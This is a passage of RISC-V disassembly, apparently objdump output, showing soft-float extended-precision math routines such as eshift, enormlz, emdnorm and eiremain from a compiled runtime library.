   1361e:	bf45                	j	135ce <ecmp+0x6a>
   13620:	4505                	li	a0,1
   13622:	d5d5                	beqz	a1,135ce <ecmp+0x6a>
   13624:	557d                	li	a0,-1
   13626:	b765                	j	135ce <ecmp+0x6a>
   13628:	557d                	li	a0,-1
   1362a:	bf7d                	j	135e8 <ecmp+0x84>

000000000001362c <eisinf.part.0>:
   1362c:	1141                	addi	sp,sp,-16
   1362e:	e406                	sd	ra,8(sp)
   13630:	e0dff0ef          	jal	ra,1343c <eisnan.part.0>
   13634:	60a2                	ld	ra,8(sp)
   13636:	00153513          	seqz	a0,a0
   1363a:	0141                	addi	sp,sp,16
   1363c:	8082                	ret

000000000001363e <eshift.part.0>:
   1363e:	7179                	addi	sp,sp,-48
   13640:	f022                	sd	s0,32(sp)
   13642:	ec26                	sd	s1,24(sp)
   13644:	f406                	sd	ra,40(sp)
   13646:	e84a                	sd	s2,16(sp)
   13648:	e44e                	sd	s3,8(sp)
   1364a:	84ae                	mv	s1,a1
   1364c:	842a                	mv	s0,a0
   1364e:	0605cb63          	bltz	a1,136c4 <eshift.part.0+0x86>
   13652:	47bd                	li	a5,15
   13654:	862e                	mv	a2,a1
   13656:	0511                	addi	a0,a0,4
   13658:	01840693          	addi	a3,s0,24
   1365c:	45bd                	li	a1,15
   1365e:	0297d063          	bge	a5,s1,1367e <eshift.part.0+0x40>
   13662:	87aa                	mv	a5,a0
   13664:	0027d703          	lhu	a4,2(a5)
   13668:	0789                	addi	a5,a5,2
   1366a:	fee79f23          	sh	a4,-2(a5)
   1366e:	fed79be3          	bne	a5,a3,13664 <eshift.part.0+0x26>
   13672:	00041c23          	sh	zero,24(s0)
   13676:	3641                	addiw	a2,a2,-16
   13678:	fec5c5e3          	blt	a1,a2,13662 <eshift.part.0+0x24>
   1367c:	88bd                	andi	s1,s1,15
   1367e:	479d                	li	a5,7
   13680:	0297d463          	bge	a5,s1,136a8 <eshift.part.0+0x6a>
   13684:	01840713          	addi	a4,s0,24
   13688:	00240593          	addi	a1,s0,2
   1368c:	4781                	li	a5,0
   1368e:	00075683          	lhu	a3,0(a4)
   13692:	1779                	addi	a4,a4,-2
   13694:	00869613          	slli	a2,a3,0x8
   13698:	8fd1                	or	a5,a5,a2
   1369a:	00f71123          	sh	a5,2(a4)
   1369e:	0086d793          	srli	a5,a3,0x8
   136a2:	feb716e3          	bne	a4,a1,1368e <eshift.part.0+0x50>
   136a6:	34e1                	addiw	s1,s1,-8
   136a8:	c491                	beqz	s1,136b4 <eshift.part.0+0x76>
   136aa:	34fd                	addiw	s1,s1,-1
   136ac:	8522                	mv	a0,s0
   136ae:	cc1ff0ef          	jal	ra,1336e <eshup1>
   136b2:	fce5                	bnez	s1,136aa <eshift.part.0+0x6c>
   136b4:	4501                	li	a0,0
   136b6:	70a2                	ld	ra,40(sp)
   136b8:	7402                	ld	s0,32(sp)
   136ba:	64e2                	ld	s1,24(sp)
   136bc:	6942                	ld	s2,16(sp)
   136be:	69a2                	ld	s3,8(sp)
   136c0:	6145                	addi	sp,sp,48
   136c2:	8082                	ret
   136c4:	57c5                	li	a5,-15
   136c6:	40b0093b          	negw	s2,a1
   136ca:	0ef5d463          	bge	a1,a5,137b2 <eshift.part.0+0x174>
   136ce:	01850593          	addi	a1,a0,24
   136d2:	4981                	li	s3,0
   136d4:	00450693          	addi	a3,a0,4
   136d8:	463d                	li	a2,15
   136da:	01845703          	lhu	a4,24(s0)
   136de:	87ae                	mv	a5,a1
   136e0:	00e9e9b3          	or	s3,s3,a4
   136e4:	ffe7d703          	lhu	a4,-2(a5)
   136e8:	17f9                	addi	a5,a5,-2
   136ea:	00e79123          	sh	a4,2(a5)
   136ee:	fed79be3          	bne	a5,a3,136e4 <eshift.part.0+0xa6>
   136f2:	00041223          	sh	zero,4(s0)
   136f6:	3941                	addiw	s2,s2,-16
   136f8:	ff2641e3          	blt	a2,s2,136da <eshift.part.0+0x9c>
   136fc:	57c1                	li	a5,-16
   136fe:	5745                	li	a4,-15
   13700:	9f85                	subw	a5,a5,s1
   13702:	4901                	li	s2,0
   13704:	08e4c063          	blt	s1,a4,13784 <eshift.part.0+0x146>
   13708:	00f9093b          	addw	s2,s2,a5
   1370c:	479d                	li	a5,7
   1370e:	0327df63          	bge	a5,s2,1374c <eshift.part.0+0x10e>
   13712:	0109999b          	slliw	s3,s3,0x10
   13716:	4109d99b          	sraiw	s3,s3,0x10
   1371a:	01844783          	lbu	a5,24(s0)
   1371e:	01a40593          	addi	a1,s0,26
   13722:	00f9e9b3          	or	s3,s3,a5
   13726:	19c2                	slli	s3,s3,0x30
   13728:	0309d993          	srli	s3,s3,0x30
   1372c:	4781                	li	a5,0
   1372e:	0006d603          	lhu	a2,0(a3)
   13732:	0689                	addi	a3,a3,2
   13734:	0086571b          	srliw	a4,a2,0x8
   13738:	8f5d                	or	a4,a4,a5
   1373a:	0086179b          	slliw	a5,a2,0x8
   1373e:	17c2                	slli	a5,a5,0x30
   13740:	fee69f23          	sh	a4,-2(a3)
   13744:	93c1                	srli	a5,a5,0x30
   13746:	feb694e3          	bne	a3,a1,1372e <eshift.part.0+0xf0>
   1374a:	3961                	addiw	s2,s2,-8
   1374c:	04090b63          	beqz	s2,137a2 <eshift.part.0+0x164>
   13750:	01845783          	lhu	a5,24(s0)
   13754:	397d                	addiw	s2,s2,-1
   13756:	8522                	mv	a0,s0
   13758:	8b85                	andi	a5,a5,1
   1375a:	0137e9b3          	or	s3,a5,s3
   1375e:	bc5ff0ef          	jal	ra,13322 <eshdn1>
   13762:	fe0917e3          	bnez	s2,13750 <eshift.part.0+0x112>
   13766:	0109979b          	slliw	a5,s3,0x10
   1376a:	4107d79b          	sraiw	a5,a5,0x10
   1376e:	e78d                	bnez	a5,13798 <eshift.part.0+0x15a>
   13770:	03099513          	slli	a0,s3,0x30
   13774:	9141                	srli	a0,a0,0x30
   13776:	70a2                	ld	ra,40(sp)
   13778:	7402                	ld	s0,32(sp)
   1377a:	64e2                	ld	s1,24(sp)
   1377c:	6942                	ld	s2,16(sp)
   1377e:	69a2                	ld	s3,8(sp)
   13780:	6145                	addi	sp,sp,48
   13782:	8082                	ret
   13784:	ff07f913          	andi	s2,a5,-16
   13788:	4120093b          	negw	s2,s2
   1378c:	00f9093b          	addw	s2,s2,a5
   13790:	479d                	li	a5,7
   13792:	fb27dde3          	bge	a5,s2,1374c <eshift.part.0+0x10e>
   13796:	bfb5                	j	13712 <eshift.part.0+0xd4>
   13798:	4985                	li	s3,1
   1379a:	03099513          	slli	a0,s3,0x30
   1379e:	9141                	srli	a0,a0,0x30
   137a0:	bfd9                	j	13776 <eshift.part.0+0x138>
   137a2:	854e                	mv	a0,s3
   137a4:	00099563          	bnez	s3,137ae <eshift.part.0+0x170>
   137a8:	1542                	slli	a0,a0,0x30
   137aa:	9141                	srli	a0,a0,0x30
   137ac:	b729                	j	136b6 <eshift.part.0+0x78>
   137ae:	4505                	li	a0,1
   137b0:	bfe5                	j	137a8 <eshift.part.0+0x16a>
   137b2:	57e5                	li	a5,-7
   137b4:	4981                	li	s3,0
   137b6:	f8f5dde3          	bge	a1,a5,13750 <eshift.part.0+0x112>
   137ba:	00440693          	addi	a3,s0,4
   137be:	bfb1                	j	1371a <eshift.part.0+0xdc>

00000000000137c0 <enormlz>:
   137c0:	00455783          	lhu	a5,4(a0)
   137c4:	1101                	addi	sp,sp,-32
   137c6:	e426                	sd	s1,8(sp)
   137c8:	ec06                	sd	ra,24(sp)
   137ca:	e822                	sd	s0,16(sp)
   137cc:	e04a                	sd	s2,0(sp)
   137ce:	84aa                	mv	s1,a0
   137d0:	ebc5                	bnez	a5,13880 <enormlz+0xc0>
   137d2:	00655703          	lhu	a4,6(a0)
   137d6:	4401                	li	s0,0
   137d8:	0107179b          	slliw	a5,a4,0x10
   137dc:	4107d79b          	sraiw	a5,a5,0x10
   137e0:	02079693          	slli	a3,a5,0x20
   137e4:	0806c763          	bltz	a3,13872 <enormlz+0xb2>
   137e8:	01a50693          	addi	a3,a0,26
   137ec:	0a000613          	li	a2,160
   137f0:	e31d                	bnez	a4,13816 <enormlz+0x56>
   137f2:	00648793          	addi	a5,s1,6
   137f6:	a019                	j	137fc <enormlz+0x3c>
   137f8:	0007d703          	lhu	a4,0(a5)
   137fc:	0789                	addi	a5,a5,2
   137fe:	fee79e23          	sh	a4,-4(a5)
   13802:	fef69be3          	bne	a3,a5,137f8 <enormlz+0x38>
   13806:	00049c23          	sh	zero,24(s1)
   1380a:	2441                	addiw	s0,s0,16
   1380c:	06c40363          	beq	s0,a2,13872 <enormlz+0xb2>
   13810:	0064d703          	lhu	a4,6(s1)
   13814:	df79                	beqz	a4,137f2 <enormlz+0x32>
   13816:	f0077793          	andi	a5,a4,-256
   1381a:	eb8d                	bnez	a5,1384c <enormlz+0x8c>
   1381c:	01848513          	addi	a0,s1,24
   13820:	00248593          	addi	a1,s1,2
   13824:	4781                	li	a5,0
   13826:	872a                	mv	a4,a0
   13828:	00075683          	lhu	a3,0(a4)
   1382c:	1779                	addi	a4,a4,-2
   1382e:	00869613          	slli	a2,a3,0x8
   13832:	8fd1                	or	a5,a5,a2
   13834:	00f71123          	sh	a5,2(a4)
   13838:	0086d793          	srli	a5,a3,0x8
   1383c:	fee596e3          	bne	a1,a4,13828 <enormlz+0x68>
   13840:	0064d703          	lhu	a4,6(s1)
   13844:	2421                	addiw	s0,s0,8
   13846:	f0077793          	andi	a5,a4,-256
   1384a:	dfe9                	beqz	a5,13824 <enormlz+0x64>
   1384c:	0a000913          	li	s2,160
   13850:	a801                	j	13860 <enormlz+0xa0>
   13852:	2405                	addiw	s0,s0,1
   13854:	b1bff0ef          	jal	ra,1336e <eshup1>
   13858:	00894d63          	blt	s2,s0,13872 <enormlz+0xb2>
   1385c:	0064d703          	lhu	a4,6(s1)
   13860:	0107171b          	slliw	a4,a4,0x10
   13864:	4107571b          	sraiw	a4,a4,0x10
   13868:	02071793          	slli	a5,a4,0x20
   1386c:	8526                	mv	a0,s1
   1386e:	fe07d2e3          	bgez	a5,13852 <enormlz+0x92>
   13872:	60e2                	ld	ra,24(sp)
   13874:	8522                	mv	a0,s0
   13876:	6442                	ld	s0,16(sp)
   13878:	64a2                	ld	s1,8(sp)
   1387a:	6902                	ld	s2,0(sp)
   1387c:	6105                	addi	sp,sp,32
   1387e:	8082                	ret
   13880:	f007f713          	andi	a4,a5,-256
   13884:	4401                	li	s0,0
   13886:	e705                	bnez	a4,138ae <enormlz+0xee>
   13888:	f6f00913          	li	s2,-145
   1388c:	a801                	j	1389c <enormlz+0xdc>
   1388e:	347d                	addiw	s0,s0,-1
   13890:	a93ff0ef          	jal	ra,13322 <eshdn1>
   13894:	fd240fe3          	beq	s0,s2,13872 <enormlz+0xb2>
   13898:	0044d783          	lhu	a5,4(s1)
   1389c:	8526                	mv	a0,s1
   1389e:	fbe5                	bnez	a5,1388e <enormlz+0xce>
   138a0:	60e2                	ld	ra,24(sp)
   138a2:	8522                	mv	a0,s0
   138a4:	6442                	ld	s0,16(sp)
   138a6:	64a2                	ld	s1,8(sp)
   138a8:	6902                	ld	s2,0(sp)
   138aa:	6105                	addi	sp,sp,32
   138ac:	8082                	ret
   138ae:	00450693          	addi	a3,a0,4
   138b2:	01a50593          	addi	a1,a0,26
   138b6:	4701                	li	a4,0
   138b8:	a019                	j	138be <enormlz+0xfe>
   138ba:	0006d783          	lhu	a5,0(a3)
   138be:	0087d61b          	srliw	a2,a5,0x8
   138c2:	8f51                	or	a4,a4,a2
   138c4:	0087979b          	slliw	a5,a5,0x8
   138c8:	00e69023          	sh	a4,0(a3)
   138cc:	03079713          	slli	a4,a5,0x30
   138d0:	0689                	addi	a3,a3,2
   138d2:	9341                	srli	a4,a4,0x30
   138d4:	feb693e3          	bne	a3,a1,138ba <enormlz+0xfa>
   138d8:	0044d783          	lhu	a5,4(s1)
   138dc:	5461                	li	s0,-8
   138de:	b76d                	j	13888 <enormlz+0xc8>

00000000000138e0 <emdnorm>:
   138e0:	7139                	addi	sp,sp,-64
   138e2:	f822                	sd	s0,48(sp)
   138e4:	f426                	sd	s1,40(sp)
   138e6:	f04a                	sd	s2,32(sp)
   138e8:	ec4e                	sd	s3,24(sp)
   138ea:	e852                	sd	s4,16(sp)
   138ec:	e456                	sd	s5,8(sp)
   138ee:	8936                	mv	s2,a3
   138f0:	84be                	mv	s1,a5
   138f2:	fc06                	sd	ra,56(sp)
   138f4:	842a                	mv	s0,a0
   138f6:	89ae                	mv	s3,a1
   138f8:	8a32                	mv	s4,a2
   138fa:	8aba                	mv	s5,a4
   138fc:	ec5ff0ef          	jal	ra,137c0 <enormlz>
   13900:	09000793          	li	a5,144
   13904:	40a90933          	sub	s2,s2,a0
   13908:	12a7db63          	bge	a5,a0,13a3e <emdnorm+0x15e>
   1390c:	67a1                	lui	a5,0x8
   1390e:	17f9                	addi	a5,a5,-2
   13910:	1927dd63          	bge	a5,s2,13aaa <emdnorm+0x1ca>
   13914:	160a8b63          	beqz	s5,13a8a <emdnorm+0x1aa>
   13918:	40c8                	lw	a0,4(s1)
   1391a:	409c                	lw	a5,0(s1)
   1391c:	04a78e63          	beq	a5,a0,13978 <emdnorm+0x98>
   13920:	01a48713          	addi	a4,s1,26
   13924:	03448793          	addi	a5,s1,52
   13928:	0709                	addi	a4,a4,2
   1392a:	fe071f23          	sh	zero,-2(a4)
   1392e:	fef71de3          	bne	a4,a5,13928 <emdnorm+0x48>
   13932:	03800793          	li	a5,56
   13936:	28f50263          	beq	a0,a5,13bba <emdnorm+0x2da>
   1393a:	12a7d163          	bge	a5,a0,13a5c <emdnorm+0x17c>
   1393e:	04000793          	li	a5,64
   13942:	24f50c63          	beq	a0,a5,13b9a <emdnorm+0x2ba>
   13946:	07100793          	li	a5,113
   1394a:	28f51163          	bne	a0,a5,13bcc <emdnorm+0x2ec>
   1394e:	47a9                	li	a5,10
   13950:	40008737          	lui	a4,0x40008
   13954:	177d                	addi	a4,a4,-1
   13956:	1782                	slli	a5,a5,0x20
   13958:	07a9                	addi	a5,a5,10
   1395a:	c8d8                	sw	a4,20(s1)
   1395c:	7761                	lui	a4,0xffff8
   1395e:	00e49c23          	sh	a4,24(s1)
   13962:	e49c                	sd	a5,8(s1)
   13964:	6721                	lui	a4,0x8
   13966:	47a9                	li	a5,10
   13968:	07a1                	addi	a5,a5,8
   1396a:	0786                	slli	a5,a5,0x1
   1396c:	97a6                	add	a5,a5,s1
   1396e:	00e79523          	sh	a4,10(a5) # 800a <register_fini-0x80a6>
   13972:	c088                	sw	a0,0(s1)
   13974:	17205163          	blez	s2,13ad6 <emdnorm+0x1f6>
   13978:	4494                	lw	a3,8(s1)
   1397a:	0144d603          	lhu	a2,20(s1)
   1397e:	08f00793          	li	a5,143
   13982:	00169713          	slli	a4,a3,0x1
   13986:	00e40833          	add	a6,s0,a4
   1398a:	00085883          	lhu	a7,0(a6) # ffffffffffff8000 <__BSS_END__+0xfffffffffffbf978>
   1398e:	00c8f5b3          	and	a1,a7,a2
   13992:	02a7ce63          	blt	a5,a0,139ce <emdnorm+0xee>
   13996:	47ad                	li	a5,11
   13998:	02d7cb63          	blt	a5,a3,139ce <emdnorm+0xee>
   1399c:	9f95                	subw	a5,a5,a3
   1399e:	1782                	slli	a5,a5,0x20
   139a0:	9381                	srli	a5,a5,0x20
   139a2:	97b6                	add	a5,a5,a3
   139a4:	00179693          	slli	a3,a5,0x1
   139a8:	0709                	addi	a4,a4,2
   139aa:	00440793          	addi	a5,s0,4
   139ae:	9722                	add	a4,a4,s0
   139b0:	97b6                	add	a5,a5,a3
   139b2:	00075683          	lhu	a3,0(a4) # 8000 <register_fini-0x80b0>
   139b6:	c299                	beqz	a3,139bc <emdnorm+0xdc>
   139b8:	0015e593          	ori	a1,a1,1
   139bc:	00071023          	sh	zero,0(a4)
   139c0:	0709                	addi	a4,a4,2
   139c2:	fee798e3          	bne	a5,a4,139b2 <emdnorm+0xd2>
   139c6:	00085883          	lhu	a7,0(a6)
   139ca:	0144d603          	lhu	a2,20(s1)
   139ce:	fff64613          	not	a2,a2
   139d2:	01167633          	and	a2,a2,a7
   139d6:	00c81023          	sh	a2,0(a6)
   139da:	0164d783          	lhu	a5,22(s1)
   139de:	00b7f733          	and	a4,a5,a1
   139e2:	cb05                	beqz	a4,13a12 <emdnorm+0x132>
   139e4:	12b78f63          	beq	a5,a1,13b22 <emdnorm+0x242>
   139e8:	03248613          	addi	a2,s1,50
   139ec:	01840693          	addi	a3,s0,24
   139f0:	04f1                	addi	s1,s1,28
   139f2:	4701                	li	a4,0
   139f4:	00065783          	lhu	a5,0(a2)
   139f8:	0006d583          	lhu	a1,0(a3)
   139fc:	16f9                	addi	a3,a3,-2
   139fe:	1679                	addi	a2,a2,-2
   13a00:	97ae                	add	a5,a5,a1
   13a02:	97ba                	add	a5,a5,a4
   13a04:	0107d713          	srli	a4,a5,0x10
   13a08:	00f69123          	sh	a5,2(a3)
   13a0c:	8b05                	andi	a4,a4,1
   13a0e:	fe9613e3          	bne	a2,s1,139f4 <emdnorm+0x114>
   13a12:	13205663          	blez	s2,13b3e <emdnorm+0x25e>
   13a16:	00445783          	lhu	a5,4(s0)
   13a1a:	e7ed                	bnez	a5,13b04 <emdnorm+0x224>
   13a1c:	67a1                	lui	a5,0x8
   13a1e:	00041c23          	sh	zero,24(s0)
   13a22:	17f9                	addi	a5,a5,-2
   13a24:	0727c563          	blt	a5,s2,13a8e <emdnorm+0x1ae>
   13a28:	01241123          	sh	s2,2(s0)
   13a2c:	70e2                	ld	ra,56(sp)
   13a2e:	7442                	ld	s0,48(sp)
   13a30:	74a2                	ld	s1,40(sp)
   13a32:	7902                	ld	s2,32(sp)
   13a34:	69e2                	ld	s3,24(sp)
   13a36:	6a42                	ld	s4,16(sp)
   13a38:	6aa2                	ld	s5,8(sp)
   13a3a:	6121                	addi	sp,sp,64
   13a3c:	8082                	ret
   13a3e:	0a095a63          	bgez	s2,13af2 <emdnorm+0x212>
   13a42:	f7000793          	li	a5,-144
   13a46:	06f95b63          	bge	s2,a5,13abc <emdnorm+0x1dc>
   13a4a:	00240793          	addi	a5,s0,2
   13a4e:	0469                	addi	s0,s0,26
   13a50:	0789                	addi	a5,a5,2
   13a52:	fe079f23          	sh	zero,-2(a5) # 7ffe <register_fini-0x80b2>
   13a56:	fe879de3          	bne	a5,s0,13a50 <emdnorm+0x170>
   13a5a:	bfc9                	j	13a2c <emdnorm+0x14c>
   13a5c:	47e1                	li	a5,24
   13a5e:	10f50f63          	beq	a0,a5,13b7c <emdnorm+0x29c>
   13a62:	03500793          	li	a5,53
   13a66:	16f51363          	bne	a0,a5,13bcc <emdnorm+0x2ec>
   13a6a:	040006b7          	lui	a3,0x4000
   13a6e:	6705                	lui	a4,0x1
   13a70:	7ff68693          	addi	a3,a3,2047 # 40007ff <__BSS_END__+0x3fc8177>
   13a74:	4799                	li	a5,6
   13a76:	80070713          	addi	a4,a4,-2048 # 800 <register_fini-0xf8b0>
   13a7a:	c8d4                	sw	a3,20(s1)
   13a7c:	1782                	slli	a5,a5,0x20
   13a7e:	0799                	addi	a5,a5,6
   13a80:	e49c                	sd	a5,8(s1)
   13a82:	00e49c23          	sh	a4,24(s1)
   13a86:	4799                	li	a5,6
   13a88:	b5c5                	j	13968 <emdnorm+0x88>
   13a8a:	00041c23          	sh	zero,24(s0)
   13a8e:	77e1                	lui	a5,0xffff8
   13a90:	fff7c793          	not	a5,a5
   13a94:	00f41123          	sh	a5,2(s0)
   13a98:	00440793          	addi	a5,s0,4
   13a9c:	0461                	addi	s0,s0,24
   13a9e:	00079023          	sh	zero,0(a5) # ffffffffffff8000 <__BSS_END__+0xfffffffffffbf978>
   13aa2:	0789                	addi	a5,a5,2
   13aa4:	fef41de3          	bne	s0,a5,13a9e <emdnorm+0x1be>
   13aa8:	b751                	j	13a2c <emdnorm+0x14c>
   13aaa:	00240793          	addi	a5,s0,2
   13aae:	0469                	addi	s0,s0,26
   13ab0:	0789                	addi	a5,a5,2
   13ab2:	fe079f23          	sh	zero,-2(a5)
   13ab6:	fe879de3          	bne	a5,s0,13ab0 <emdnorm+0x1d0>
   13aba:	bf8d                	j	13a2c <emdnorm+0x14c>
   13abc:	0009059b          	sext.w	a1,s2
   13ac0:	8522                	mv	a0,s0
   13ac2:	b7dff0ef          	jal	ra,1363e <eshift.part.0>
   13ac6:	c111                	beqz	a0,13aca <emdnorm+0x1ea>
   13ac8:	4985                	li	s3,1
   13aca:	0a0a8463          	beqz	s5,13b72 <emdnorm+0x292>
   13ace:	40c8                	lw	a0,4(s1)
   13ad0:	409c                	lw	a5,0(s1)
   13ad2:	e4a797e3          	bne	a5,a0,13920 <emdnorm+0x40>
   13ad6:	09000793          	li	a5,144
   13ada:	08f50163          	beq	a0,a5,13b5c <emdnorm+0x27c>
   13ade:	01845783          	lhu	a5,24(s0)
   13ae2:	8522                	mv	a0,s0
   13ae4:	8b85                	andi	a5,a5,1
   13ae6:	00f9e9b3          	or	s3,s3,a5
   13aea:	839ff0ef          	jal	ra,13322 <eshdn1>
   13aee:	40c8                	lw	a0,4(s1)
   13af0:	b561                	j	13978 <emdnorm+0x98>
   13af2:	f20a85e3          	beqz	s5,13a1c <emdnorm+0x13c>
   13af6:	40c8                	lw	a0,4(s1)
   13af8:	409c                	lw	a5,0(s1)
   13afa:	e2a793e3          	bne	a5,a0,13920 <emdnorm+0x40>
   13afe:	e7204de3          	bgtz	s2,13978 <emdnorm+0x98>
   13b02:	bfd1                	j	13ad6 <emdnorm+0x1f6>
   13b04:	8522                	mv	a0,s0
   13b06:	81dff0ef          	jal	ra,13322 <eshdn1>
   13b0a:	67a1                	lui	a5,0x8
   13b0c:	0905                	addi	s2,s2,1
   13b0e:	00041c23          	sh	zero,24(s0)
   13b12:	17f9                	addi	a5,a5,-2
   13b14:	f727cde3          	blt	a5,s2,13a8e <emdnorm+0x1ae>
   13b18:	f00958e3          	bgez	s2,13a28 <emdnorm+0x148>
   13b1c:	00041123          	sh	zero,2(s0)
   13b20:	b731                	j	13a2c <emdnorm+0x14c>
   13b22:	08099963          	bnez	s3,13bb4 <emdnorm+0x2d4>
   13b26:	44dc                	lw	a5,12(s1)
   13b28:	0184d703          	lhu	a4,24(s1)
   13b2c:	0786                	slli	a5,a5,0x1
   13b2e:	97a2                	add	a5,a5,s0
   13b30:	0007d783          	lhu	a5,0(a5) # 8000 <register_fini-0x80b0>
   13b34:	8ff9                	and	a5,a5,a4
   13b36:	ea0799e3          	bnez	a5,139e8 <emdnorm+0x108>
   13b3a:	ed204ee3          	bgtz	s2,13a16 <emdnorm+0x136>
   13b3e:	09000793          	li	a5,144
   13b42:	00f50563          	beq	a0,a5,13b4c <emdnorm+0x26c>
   13b46:	8522                	mv	a0,s0
   13b48:	827ff0ef          	jal	ra,1336e <eshup1>
   13b4c:	00445783          	lhu	a5,4(s0)
   13b50:	fbd5                	bnez	a5,13b04 <emdnorm+0x224>
   13b52:	00041c23          	sh	zero,24(s0)
   13b56:	fc0943e3          	bltz	s2,13b1c <emdnorm+0x23c>
   13b5a:	b5f9                	j	13a28 <emdnorm+0x148>
   13b5c:	0084a803          	lw	a6,8(s1)
   13b60:	0144d603          	lhu	a2,20(s1)
   13b64:	0806                	slli	a6,a6,0x1
   13b66:	9822                	add	a6,a6,s0
   13b68:	00085883          	lhu	a7,0(a6)
   13b6c:	011675b3          	and	a1,a2,a7
   13b70:	bdb9                	j	139ce <emdnorm+0xee>
   13b72:	00041c23          	sh	zero,24(s0)
   13b76:	00041123          	sh	zero,2(s0)
   13b7a:	bd4d                	j	13a2c <emdnorm+0x14c>
   13b7c:	4791                	li	a5,4
   13b7e:	00800737          	lui	a4,0x800
   13b82:	0ff70713          	addi	a4,a4,255 # 8000ff <__BSS_END__+0x7c7a77>
   13b86:	1782                	slli	a5,a5,0x20
   13b88:	0791                	addi	a5,a5,4
   13b8a:	c8d8                	sw	a4,20(s1)
   13b8c:	10000713          	li	a4,256
   13b90:	e49c                	sd	a5,8(s1)
   13b92:	00e49c23          	sh	a4,24(s1)
   13b96:	4791                	li	a5,4
   13b98:	bbc1                	j	13968 <emdnorm+0x88>
   13b9a:	478d                	li	a5,3
   13b9c:	80010737          	lui	a4,0x80010
   13ba0:	177d                	addi	a4,a4,-1
   13ba2:	1786                	slli	a5,a5,0x21
   13ba4:	079d                	addi	a5,a5,7
   13ba6:	c8d8                	sw	a4,20(s1)
   13ba8:	4705                	li	a4,1
   13baa:	e49c                	sd	a5,8(s1)
   13bac:	00e49c23          	sh	a4,24(s1)
   13bb0:	4799                	li	a5,6
   13bb2:	bb5d                	j	13968 <emdnorm+0x88>
   13bb4:	e20a0ae3          	beqz	s4,139e8 <emdnorm+0x108>
   13bb8:	bda9                	j	13a12 <emdnorm+0x132>
   13bba:	00800737          	lui	a4,0x800
   13bbe:	0ff70713          	addi	a4,a4,255 # 8000ff <__BSS_END__+0x7c7a77>
   13bc2:	c8d8                	sw	a4,20(s1)
   13bc4:	4799                	li	a5,6
   13bc6:	10000713          	li	a4,256
   13bca:	bd4d                	j	13a7c <emdnorm+0x19c>
   13bcc:	47ad                	li	a5,11
   13bce:	80010737          	lui	a4,0x80010
   13bd2:	177d                	addi	a4,a4,-1
   13bd4:	1782                	slli	a5,a5,0x20
   13bd6:	07b1                	addi	a5,a5,12
   13bd8:	c8d8                	sw	a4,20(s1)
   13bda:	4705                	li	a4,1
   13bdc:	e49c                	sd	a5,8(s1)
   13bde:	00e49c23          	sh	a4,24(s1)
   13be2:	47ad                	li	a5,11
   13be4:	b351                	j	13968 <emdnorm+0x88>

0000000000013be6 <eiremain>:
   13be6:	711d                	addi	sp,sp,-96
   13be8:	e4a6                	sd	s1,72(sp)
   13bea:	fc4e                	sd	s3,56(sp)
   13bec:	84ae                	mv	s1,a1
   13bee:	00255983          	lhu	s3,2(a0)
   13bf2:	ec86                	sd	ra,88(sp)
   13bf4:	e8a2                	sd	s0,80(sp)
   13bf6:	e0ca                	sd	s2,64(sp)
   13bf8:	f852                	sd	s4,48(sp)
   13bfa:	8932                	mv	s2,a2
   13bfc:	f456                	sd	s5,40(sp)
   13bfe:	f05a                	sd	s6,32(sp)
   13c00:	ec5e                	sd	s7,24(sp)
   13c02:	e862                	sd	s8,16(sp)
   13c04:	e466                	sd	s9,8(sp)
   13c06:	e06a                	sd	s10,0(sp)
   13c08:	8a2a                	mv	s4,a0
   13c0a:	bb7ff0ef          	jal	ra,137c0 <enormlz>
   13c0e:	0024d403          	lhu	s0,2(s1)
   13c12:	87aa                	mv	a5,a0
   13c14:	8526                	mv	a0,s1
   13c16:	40f989b3          	sub	s3,s3,a5
   13c1a:	03490a93          	addi	s5,s2,52
   13c1e:	ba3ff0ef          	jal	ra,137c0 <enormlz>
   13c22:	8c09                	sub	s0,s0,a0
   13c24:	04e90713          	addi	a4,s2,78
   13c28:	87d6                	mv	a5,s5
   13c2a:	0789                	addi	a5,a5,2
   13c2c:	fe079f23          	sh	zero,-2(a5)
   13c30:	fee79de3          	bne	a5,a4,13c2a <eiremain+0x44>
   13c34:	07344b63          	blt	s0,s3,13caa <eiremain+0xc4>
   13c38:	004a0b93          	addi	s7,s4,4
   13c3c:	00448b13          	addi	s6,s1,4
   13c40:	19fd                	addi	s3,s3,-1
   13c42:	01aa0c93          	addi	s9,s4,26
   13c46:	00248c13          	addi	s8,s1,2
   13c4a:	875a                	mv	a4,s6
   13c4c:	87de                	mv	a5,s7
   13c4e:	0007d603          	lhu	a2,0(a5)
   13c52:	00075683          	lhu	a3,0(a4) # ffffffff80010000 <__BSS_END__+0xffffffff7ffd7978>
   13c56:	0789                	addi	a5,a5,2
   13c58:	0709                	addi	a4,a4,2
   13c5a:	06d61c63          	bne	a2,a3,13cd2 <eiremain+0xec>
   13c5e:	fefc98e3          	bne	s9,a5,13c4e <eiremain+0x68>
   13c62:	018a0613          	addi	a2,s4,24
   13c66:	01848713          	addi	a4,s1,24
   13c6a:	4681                	li	a3,0
   13c6c:	00075783          	lhu	a5,0(a4)
   13c70:	00065583          	lhu	a1,0(a2)
   13c74:	1779                	addi	a4,a4,-2
   13c76:	8f95                	sub	a5,a5,a3
   13c78:	8f8d                	sub	a5,a5,a1
   13c7a:	0107d693          	srli	a3,a5,0x10
   13c7e:	00f71123          	sh	a5,2(a4)
   13c82:	8a85                	andi	a3,a3,1
   13c84:	1679                	addi	a2,a2,-2
   13c86:	feec13e3          	bne	s8,a4,13c6c <eiremain+0x86>
   13c8a:	4d05                	li	s10,1
   13c8c:	8556                	mv	a0,s5
   13c8e:	ee0ff0ef          	jal	ra,1336e <eshup1>
   13c92:	04c95783          	lhu	a5,76(s2)
   13c96:	147d                	addi	s0,s0,-1
   13c98:	8526                	mv	a0,s1
   13c9a:	00fd6d33          	or	s10,s10,a5
   13c9e:	05a91623          	sh	s10,76(s2)
   13ca2:	eccff0ef          	jal	ra,1336e <eshup1>
   13ca6:	fb3412e3          	bne	s0,s3,13c4a <eiremain+0x64>
   13caa:	86a2                	mv	a3,s0
   13cac:	6446                	ld	s0,80(sp)
   13cae:	60e6                	ld	ra,88(sp)
